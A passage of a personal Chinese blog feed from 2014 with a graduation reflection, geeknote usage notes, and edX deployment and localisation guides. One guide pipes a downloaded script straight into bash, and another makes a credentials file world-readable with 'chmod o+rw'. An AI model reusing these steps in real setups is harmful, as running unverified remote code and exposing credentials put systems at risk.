&lt;p&gt;本来我已经按部就班进了个央企,也许就打算终老里边了,据说待遇不错的,据说宿舍是按四星级标准建的,据说人员95%都是内部安排,很少吸纳外部人员,我不知道他们看上我什么,舍友说应该弹冠相庆才是.&lt;/p&gt;
&lt;p&gt;结果知乎又把我拉了出来,感谢曾经给过我帮助的知友们,在我摇摆不定的时候.我想清楚了,我想做自己喜欢的东西,趁我还年轻,趁我还输得起.&lt;/p&gt;
&lt;p&gt;于是我决定毁约,我说服hr配合我和学校沟通,也十分感激hr的支持.我想你应该也看到了这里了吧,我说过会当面致谢的.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;也许磨难才刚刚开始吧,谁知道呢,我不知道将来如何,我也不在乎.&lt;/p&gt;
&lt;p&gt;很开心终于能在大学结束前,知道自己大约是怎样的人,知道自己喜欢什么,想要什么,也许在某些人眼里还算有趣,也许还算可爱呢.&lt;/p&gt;
&lt;p&gt;我其实也挺喜欢现在这个有点二有点蠢有点不要脸却也有些有趣的自己.&lt;/p&gt;
&lt;p&gt;我想起看过的这句话&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;成功的方式只有一种吧--按照自己的方式去度过人生&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;希望有朝一日能做到刘瑜说的&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;不气馁，有召唤，爱自由&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h4&gt;3&lt;/h4&gt;
&lt;p&gt;大四一年用代码换了不少零花钱，游山玩水。 &lt;/p&gt;
&lt;p&gt;也着实过了半年的土豪生活。&lt;/p&gt;
&lt;p&gt;由于毕设的缘故,没能抽出足够的时间去西藏,是为一大遗憾.&lt;/p&gt;
&lt;p&gt;南京部分,已经写过,就不在这里写了.&lt;/p&gt;
&lt;p&gt;我很喜欢西安的城墙,春风浩荡,落日徐徐,人影参差.&lt;/p&gt;
&lt;p&gt;也喜欢回民街的小吃,灯火明灭的音乐喷泉以及忘记名字的火锅里的鱼.&lt;/p&gt;
&lt;p&gt;以及,你的款待.&lt;/p&gt;
&lt;h4&gt;4&lt;/h4&gt;
&lt;p&gt;结识了许多有趣的人.  &lt;/p&gt;
&lt;p&gt;这个先搁置一下,不知道怎么下手.感觉篇幅已经很长了...&lt;/p&gt;
&lt;h4&gt;5&lt;/h4&gt;
&lt;p&gt;我设想过很多版本的场景,关于离校的那天.&lt;/p&gt;
&lt;p&gt;逗比的，文艺的，炫酷的，屌炸天的。&lt;/p&gt;
&lt;p&gt;我是入侵一下学校主页,在上面留下"万水千山一转身"好呢，还是在路上随意找个不认识的妹子表个白,吓她一跳，表白内容就读刘瑜的那段情书好了。&lt;/p&gt;
&lt;p&gt;或者干脆从书包里掏出二锅头，基友们一边闷,一边应景一句 "莫愁前路无知己 天下谁人不识君"&lt;/p&gt;
&lt;p&gt;我说"西出阳关无故人",虽然我是往南走,管他呢.&lt;/p&gt;
&lt;p&gt;然后我就可以把这段经历拿到知乎上回答 &lt;code&gt;你离校是怎样的场景&lt;/code&gt;这类问题.&lt;/p&gt;
&lt;p&gt;我都估计好我会在第一个晚上获得32个赞，然后第二天更多，然后有妹子说，哇你才大四啊，英雄出少年诶.然后点击关注.&lt;/p&gt;
&lt;p&gt;你看我都意淫了这么多种可能.&lt;/p&gt;
&lt;p&gt;你看我比我刚来大学那会儿还要逗比是不是.&lt;/p&gt;
&lt;p&gt;我到时候脑子进水,估计会从眼睛里溢出. &lt;/p&gt;
&lt;p&gt;我刚来的时候还谦谦有礼.&lt;/p&gt;
&lt;p&gt;怎么离开的时候就变得如此风骚矫情了.&lt;/p&gt;
&lt;p&gt;我喜欢大学里的我，我喜欢大学里遇到的你们.&lt;/p&gt;
&lt;p&gt;本来不太喜欢这个有点小且破的学校，现在却有些舍不得了.&lt;/p&gt;
&lt;p&gt;他妹的。  &lt;/p&gt;
&lt;p&gt;或许是因为，你们都还在这里啊。&lt;/p&gt;
&lt;p&gt;喜欢图书馆的角落，网络中心的大床，喜欢最后一排的视野，早起看雪的时光。&lt;/p&gt;
&lt;p&gt;也喜欢四餐的饭，老乡会的月饼，以及我的笔记上的，你蝇头小楷的字,还有我狗屁不通的诗章。&lt;/p&gt;
&lt;p&gt;当然也喜欢夜不归宿，喜欢翘课去玩.&lt;/p&gt;
&lt;p&gt;我这美好炫酷有些温暖的四年.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 06 Jun 2014 00:00:00 +0000</pubDate><guid>tag:,2014-06-06:four-year.html</guid><category>杂感</category></item><item><title>geeknote使用笔记</title><link>/use-geeknote.html</link><description>&lt;h3&gt;使用场景&lt;/h3&gt;
&lt;p&gt;经常需要ssh远程电脑，有时只有纯粹的命令行。&lt;/p&gt;
&lt;p&gt;习惯把笔记放在印象笔记了。一些操作指令，以及技术笔记之类。&lt;/p&gt;
&lt;p&gt;于是希望能在命令行下看印象笔记。&lt;/p&gt;
&lt;h3&gt;geeknote&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://github.com/VitaliyRodnenko/geeknote"&gt;Geeknote&lt;/a&gt; is a command line client for &lt;code&gt;Evernote&lt;/code&gt; that can be use on Linux, FreeBSD and OS X.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;它是用python写的。Geeknote只能用evernote账号登陆，如果我们要用印象笔记的话，需要使用&lt;a href="https://github.com/gmajian/geeknote"&gt;这个fork版本&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;他们除了允许使用的账号不同，其他没有区别。&lt;/p&gt;
&lt;p&gt;以下我们安装的都是印象笔记版&lt;/p&gt;
&lt;h4&gt;安装&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git clone git://github.com/gmajian/geeknote.git
cd geeknote
sudo python setup.py install

##https://github.com/neilagabriel/vim-geeknote vim插件
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;使用笔记&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;geeknote login&lt;/code&gt;:登陆&lt;/li&gt;
&lt;li&gt;&lt;code&gt;geeknote logout&lt;/code&gt;:登出&lt;/li&gt;
&lt;li&gt;&lt;code&gt;geeknote --help&lt;/code&gt;:帮助，列出可用的指令&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;发挥它&lt;/h3&gt;
&lt;p&gt;同时可以把它当做一个共享区来用&lt;/p&gt;
&lt;h4&gt;使用&lt;a href="http://www.geeknote.me/documentation/#gnsync-synchronization-app"&gt;gnsync&lt;/a&gt;来同步文件&lt;/h4&gt;
&lt;p&gt;官方给的例子：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ gnsync --path /home/project/xmpp/logs/
         --mask &lt;span class="s2"&gt;&amp;quot;*.logs&amp;quot;&lt;/span&gt;
         --logpath /home/user/logs/xmpp2evernote.log
         --notebook &lt;span class="s2"&gt;&amp;quot;XMPP logs&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 05 Jun 2014 00:00:00 +0000</pubDate><guid>tag:,2014-06-05:use-geeknote.html</guid><category>ubuntu</category></item><item><title>管理与配置edx</title><link>/edx-custom.html</link><description>&lt;p&gt;主要是参考&lt;a href="https://github.com/edx/configuration/wiki/edX-Managing-the-Production-Stack"&gt;官方教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;做些记录,备忘.&lt;/p&gt;
&lt;h3&gt;create superuser&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /edx/app/edxapp/edx-platform
sudo -u www-data /edx/bin/python.edxapp ./manage.py lms --settings aws create_user -e wwj@qq.com
sudo -u www-data /edx/bin/python.edxapp ./manage.py lms --settings aws changepassword wwj
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;登陆到django后台 /admin&lt;/h3&gt;
&lt;h4&gt;承上&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -u www-data /edx/bin/python.edxapp ./manage.py lms --settings aws shell
from django.contrib.auth.models import User
&lt;span class="nv"&gt;me&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; User.objects.get&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;username&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;wwj&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
me.is_superuser &lt;span class="o"&gt;=&lt;/span&gt; True
me.is_staff &lt;span class="o"&gt;=&lt;/span&gt; True
me.save&lt;span class="o"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;定制主题应当放到汉化之前,否则汉化会被覆盖.原因是定制主题中设计更新代码.&lt;/p&gt;
&lt;h3&gt;定制主题&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="https://github.com/edx/edx-platform/wiki"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;采用手动编译&lt;/p&gt;
&lt;p&gt;参考&lt;a href="https://github.com/edx/edx-platform/wiki/Stanford-Theming"&gt;Stanford-Theming&lt;/a&gt;&lt;br /&gt;
theme-name统一用stanford&lt;/p&gt;
&lt;p&gt;命名统一用小写&lt;/p&gt;
&lt;p&gt;更深度的定制，需要修改模板&lt;a href="http://help.42qu.com/code/mako.html"&gt;mako&lt;/a&gt;.&lt;br /&gt;
关于mako:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/zzzeek/mako"&gt;github&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.makotemplates.org/"&gt;官网&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.makotemplates.org/en/latest/"&gt;官方文档&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;汉化&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd /edx/app/edxapp/edx-platform

:::text
sudo apt-get install transifex-client
vim ~/.transifexrc


[https://www.transifex.com]
hostname = https://www.transifex.com
username = user
password = pass
token =


chmod o+rw ~/.transifexrc
sudo -u edxapp bash
source /edx/app/edxapp/edxapp_env
cd /edx/app/edxapp/edx-platform
vim ../lms.env.json


&amp;quot;USE_I18N&amp;quot;: true, #新增
&amp;quot;LANGUAGE_CODE&amp;quot;: &amp;quot;zh_CN&amp;quot;

vim ../cms.env.json

&amp;quot;USE_I18N&amp;quot;: true, #新增
&amp;quot;LANGUAGE_CODE&amp;quot;: &amp;quot;zh_CN&amp;quot;

tx pull -l zh_CN
paver i18n_generate
paver update_assets lms --settings aws
paver update_assets cms --settings aws
exit
sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp:
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;邮件&lt;/h3&gt;
&lt;p&gt;在(*)ms.env.json中添加:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;quot;EMAIL_HOST&amp;quot;: &amp;quot;smtp.qq.com&amp;quot;,
&amp;quot;EMAIL_PORT&amp;quot;: 25,
&amp;quot;EMAIL_USE_TLS&amp;quot;: true,
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;注意将"DEFAULT_FROM_EMAIL"改为你自己的邮箱，否则无法发送&lt;/p&gt;
&lt;p&gt;在(*)ms.auth.json适当位置处添加：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;quot;EMAIL_HOST_USER&amp;quot;: &amp;quot;*****&amp;quot;,
&amp;quot;EMAIL_HOST_PASSWORD&amp;quot;:&amp;quot;*****&amp;quot;,
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;重启edxapp&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp:
sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp_worker:
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;单步调试  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -u www-data /edx/app/edxapp/venvs/edxapp/bin/python ./manage.py lms --settings aws shell
from django.core.mail import send_mail
send_mail(u&amp;#39;邮件标题&amp;#39;, u&amp;#39;邮件内容&amp;#39;, &amp;#39;123@qq.com&amp;#39;, [&amp;#39;456@qq.com&amp;#39;], 
fail_silently=False)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;成功了~&lt;/p&gt;
&lt;h3&gt;日志&lt;/h3&gt;
&lt;p&gt;/var/log/mail.log  邮件
/edx/var/log/&lt;/p&gt;
&lt;h3&gt;反向代理&lt;/h3&gt;
&lt;p&gt;studio&lt;br /&gt;
nginx反向代理。studio.example.com指向studio&lt;/p&gt;
&lt;h3&gt;定制主题&lt;/h3&gt;
&lt;p&gt;诸如IONISx,修改完less之后，删除static/main.css，执行grunt.&lt;br /&gt;
之后还要&lt;a href="https://github.com/edx/configuration/wiki/edX-Managing-the-Production-Stack#compile-assets-manually"&gt;recompile the LMS assets.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;less需要编译，而templates可以直接改，立刻生效，就是说theme的路径是在搜索路径中的，并不需要将文件复制进去。theme可以多个。按名字启用。&lt;/p&gt;
&lt;h4&gt;静态文件&lt;/h4&gt;
&lt;p&gt;静态文件可以考虑先丢在外部，避免牵扯static&lt;/p&gt;
&lt;h3&gt;拓展edx,添加自己的django app&lt;/h3&gt;
&lt;p&gt;setting环境默认是env/aws.py，许多设置在common.py里
注意模板的特殊性,使用的是mako,而不是django自带的。&lt;br /&gt;
每次修改完，需要&lt;br /&gt;
&lt;code&gt;sudo /edx/bin/supervisorctl -c /edx/etc/supervisord.conf restart edxapp:&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;使用自己的edx-platform&lt;/h3&gt;
&lt;p&gt;修改&lt;a href="https://github.com/edx/configuration/blob/master/playbooks/roles/edxapp/defaults/main.yml#L608"&gt;这里&lt;/a&gt;.&lt;br /&gt;
configuration，最近一次使用的是14-7-2&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 03 Jun 2014 00:00:00 +0000</pubDate><guid>tag:,2014-06-03:edx-custom.html</guid><category>edx</category></item><item><title>在ubuntu12.04 32bit上直接部署edx生产环境</title><link>/edx-Production-stack-installation-on-a-single-Ubuntu-12.04(32bit).html</link><description>&lt;p&gt;&lt;a href="https://github.com/edx/configuration/wiki/edX-Ubuntu-12.04-64-bit-Installation"&gt;官方教程&lt;/a&gt;要求机器是64位。&lt;/p&gt;
&lt;p&gt;最近学校提供的服务器只有32位的。&lt;/p&gt;
&lt;p&gt;好吧，32位就32位。&lt;/p&gt;
&lt;p&gt;首先自然是安装ubuntu12.04 32bit &lt;/p&gt;
&lt;p&gt;大多数步骤和我的这篇教程相似&lt;a href="http://wwj718.github.io/edx-Production-stack-installation-on-a-single-Ubuntu-12.04(64bit).html"&gt;在ubuntu12.04上直接部署edx生产环境&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;遇到的问题总结&lt;/h2&gt;
&lt;h3&gt;首先需要注意的是&lt;a href="https://github.com/edx/configuration/blob/a137e9cea6a97b80464b4fd3c148a57ccca80e9b/playbooks/roles/oraclejdk/defaults/main.yml"&gt;oraclejdk&lt;/a&gt;的默认版本是x64，我们需要的是32位的，所以将&lt;code&gt;/var/tmpconfiguration/playbooks/roles/oraclejdk/defaults/main.yml&lt;/code&gt;中的&lt;code&gt;oraclejdk_arch: "x64"&lt;/code&gt;中的&lt;code&gt;x64&lt;/code&gt;改为&lt;code&gt;i586&lt;/code&gt;&lt;/h3&gt;
&lt;h3&gt;npm直接注释掉&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;/var/tmp/configuration/playbooks/roles/xqueue/defaults/main.yml&lt;/code&gt;将&lt;code&gt;xqueue_debian_pkgs&lt;/code&gt;
中的npm注释掉.&lt;br /&gt;
最新的nodejs已经自带npm了&lt;/p&gt;
&lt;h3&gt;手动安装python依赖&lt;/h3&gt;
&lt;p&gt;自动安装的时候爆出很多错误，不清楚是不是权限问题。&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;其实写这篇文章的主要原因是，在这次的部署过程中，更多地使用了手动部署，对edx的部署过程的更多细节有了了解 ，统一做个笔记。&lt;/p&gt;
&lt;p&gt;采用的是最新版本的edx（时间为2014-7-9）&lt;/p&gt;
&lt;h3&gt;从某个任务开始&lt;/h3&gt;
&lt;p&gt;这样可以避免重复性的安装已经完成的task，需要注意的是不少task可能依赖与它之前的task所进行的配置,所以有时需要后退几个任务&lt;/p&gt;
&lt;pre&gt;
cd /var/tmp/configuration/playbooks &amp;&amp; sudo ansible-playbook -c local ./edx_sandbox.yml -i "localhost,"  --start-at-task="TASKNAME"
&lt;/pre&gt;

&lt;h3&gt;关于playbook&lt;/h3&gt;
&lt;h4&gt;对tast的理解&lt;/h4&gt;
&lt;h3&gt;修改pip 镜像地址&lt;/h3&gt;
&lt;p&gt;extra_args="-i {{ COMMON_PYPI_MIRROR_URL }}"&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 02 Jun 2014 00:00:00 +0000</pubDate><guid>tag:,2014-06-02:edx-Production-stack-installation-on-a-single-Ubuntu-12.04(32bit).html</guid><category>edx</category></item><item><title>在ubuntu12.04上直接部署edx生产环境</title><link>/edx-Production-stack-installation-on-a-single-Ubuntu-12.04(64bit).html</link><description>&lt;p&gt;主要是参考&lt;a href="https://github.com/edx/configuration/wiki/edX-Ubuntu-12.04-64-bit-Installation"&gt;官方教程&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本地环境：&lt;code&gt;ubuntu12.04 64位&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;更新系统&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo apt-get update -y
sudo apt-get upgrade -y
sudo reboot
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;使用vpn,保证网络能畅通连接到国外,你懂的.&lt;/h3&gt;
&lt;p&gt;我使用的是sshuttle,可参考&lt;a href="http://wwj718.github.io/use-sshuttle.html"&gt;我的博客&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;获取vagrant.sh脚本&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget https://raw.github.com/edx/configuration/master/util/install/vagrant.sh -O - | bash
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;遇到问题&lt;/h3&gt;
&lt;p&gt;执行vagrant.sh简本如果在nltk出错,按以下方法解决.&lt;/p&gt;
&lt;h4&gt;手动下载nltk&lt;/h4&gt;
&lt;p&gt;主要参考了这个&lt;a href="http://www.idefs.com/walk-tongji-university-shanghai.html"&gt;博客&lt;/a&gt;.&lt;br /&gt;
感谢竹轩同学的分享.&lt;/p&gt;
&lt;p&gt;nltk有近700M,手动下载,避免时间太久网络断开&lt;/p&gt;
&lt;p&gt;注：最新的代码，&lt;a href="https://github.com/edx/configuration/blob/62df7fcea53658538a5e5fe89cfe34de15b7caa0/playbooks/roles/discern/tasks/deploy.yml"&gt;位置&lt;/a&gt;有变.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd /var/tmp
wget http://edx-static.s3.amazonaws.com/nltk/nltk-data-20131113.tar.gz
chmod o+rw nltk-data-20131113.tar.gz
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;修改&lt;code&gt;/var/tmp/configuration/playbooks/edx-east/roles/ora/tasks/ease.yml&lt;/code&gt; 中的&lt;code&gt;download and install nltk&lt;/code&gt;任务内容为:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;- name: download and install nltk&lt;/span&gt;
&lt;span class="x"&gt;  shell: |&lt;/span&gt;
&lt;span class="x"&gt;      set -e&lt;/span&gt;
&lt;span class="x"&gt;      cp /var/tmp/nltk-data-20131113.tar.gz &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;ora_nltk_tmp_file&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;      tar zxf &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;ora_nltk_tmp_file&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;      rm -f &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;ora_nltk_tmp_file&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;      touch &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;ora_nltk_download_url&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nf"&gt;basename&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;-installed&lt;/span&gt;
&lt;span class="x"&gt;        creates=&lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;ora_data_dir&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;/&lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;ora_nltk_download_url&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nf"&gt;basename&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;-installed&lt;/span&gt;
&lt;span class="x"&gt;        chdir=&lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;ora_data_dir&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;  sudo_user: &amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;common_web_user&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="x"&gt;  notify:&lt;/span&gt;
&lt;span class="x"&gt;    - restart ora&lt;/span&gt;
&lt;span class="x"&gt;    - restart ora_celery&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;修改&lt;code&gt;/var/tmp/configuration/playbooks/edx-east/roles/discern/tasks/deploy.yml&lt;/code&gt; 中的&lt;code&gt;download and install nltk&lt;/code&gt;任务内容为&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;- name: download and install nltk&lt;/span&gt;
&lt;span class="x"&gt;  shell: |&lt;/span&gt;
&lt;span class="x"&gt;      set -e&lt;/span&gt;
&lt;span class="x"&gt;      cp /var/tmp/nltk-data-20131113.tar.gz &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;discern_nltk_tmp_file&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;      tar zxf &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;discern_nltk_tmp_file&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;      rm -f &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;discern_nltk_tmp_file&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;      touch &lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;discern_nltk_download_url&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nf"&gt;basename&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;-installed&lt;/span&gt;
&lt;span class="x"&gt;        creates=&lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;discern_data_dir&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;/&lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;discern_nltk_download_url&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nf"&gt;basename&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;-installed&lt;/span&gt;
&lt;span class="x"&gt;        chdir=&lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;discern_data_dir&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;span class="x"&gt;  sudo_user: &amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;{{&lt;/span&gt; &lt;span class="nv"&gt;discern_user&lt;/span&gt; &lt;span class="cp"&gt;}}&lt;/span&gt;&lt;span class="x"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="x"&gt;  notify:&lt;/span&gt;
&lt;span class="x"&gt;    - restart discern&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;手动下载django1.4.3&lt;/h4&gt;
&lt;p&gt;期间出现出现无法找到安装包的错误&lt;br /&gt;
按照提示手动安装1.4.3 &lt;br /&gt;
&lt;code&gt;sudo /edx/app/venvs/ora/bin/pip install django==1.4.3&lt;/code&gt;&lt;br /&gt;
顺便将&lt;code&gt;/edx/app/ora/ora/requirements.txt&lt;/code&gt;里出错的&lt;code&gt;django==1.4.3&lt;/code&gt;注释掉&lt;br /&gt;
此外期间会遇到的基本都是网络问题.&lt;br /&gt;
如果出现错误,重新连接sshuttle后,执行以下命令  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cd /var/tmp/configuration/playbooks &amp;amp;&amp;amp; sudo ansible-playbook -c local ./edx_sandbox.yml -i &amp;quot;localhost,&amp;quot; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;安装完的东西会跳过.&lt;/p&gt;
&lt;p&gt;如果网络顺畅,基本就可以直接部署好了.&lt;/p&gt;
&lt;h3&gt;安装完毕后,默认开机自动启动&lt;/h3&gt;
&lt;h3&gt;next&lt;/h3&gt;
&lt;p&gt;之后会在我的博客上记录汉化和更换主题的教程&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 02 Jun 2014 00:00:00 +0000</pubDate><guid>tag:,2014-06-02:edx-Production-stack-installation-on-a-single-Ubuntu-12.04(64bit).html</guid><category>edx</category></item><item><title>my dream</title><link>/my-dream.html</link><description>&lt;p&gt;我的梦想倒也简单&lt;/p&gt;
&lt;p&gt;做自己喜欢的事&lt;/p&gt;
&lt;p&gt;成为有趣的人&lt;/p&gt;
&lt;p&gt;有空就读书，兴之所致，率性而读&lt;/p&gt;
&lt;p&gt;读累了就出游，江南塞北，兴尽而归&lt;/p&gt;
&lt;p&gt;玩腻了就写些东西与人分享&lt;/p&gt;
&lt;p&gt;结交有趣的人，三教九流，萍水之交都好&lt;/p&gt;
&lt;p&gt;去发现更广阔的世界&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Fri, 30 May 2014 00:00:00 +0000</pubDate><guid>tag:,2014-05-30:my-dream.html</guid><category>随笔</category></item><item><title>几个工具</title><link>/something-interesting.html</link><description>&lt;p&gt;晚上去教十旭东那边,碰到辰瑀学长,聊了挺久,很是获益,从毕业求职谈到技术相关,很有趣.&lt;/p&gt;
&lt;p&gt;在技术方面我们有不少兴趣点相似,交谈甚欢,当然大部分都是我在请教啦:linux,安全相关,vim...&lt;/p&gt;
&lt;p&gt;辰瑀学长是重度vim用户,也是身边的小伙伴中vim用得最炫酷的,而我刚入门,却也狂热的喜欢上vim了,见其弹指如飞,煞是羡慕.&lt;/p&gt;
&lt;p&gt;这种感觉就像我当时还在使用windows时,初次见何金良学长用ubuntu和python,简直被炫酷得目瞪口呆.&lt;/p&gt;
&lt;p&gt;于是换了套他所使用的的装备.&lt;/p&gt;
&lt;p&gt;看来这次又可以换上不少强大的装备了.&lt;/p&gt;
&lt;p&gt;于是记下了不少强大的工具,做个记录:&lt;/p&gt;
&lt;h3&gt;vim相关:&lt;/h3&gt;
&lt;ul&gt;
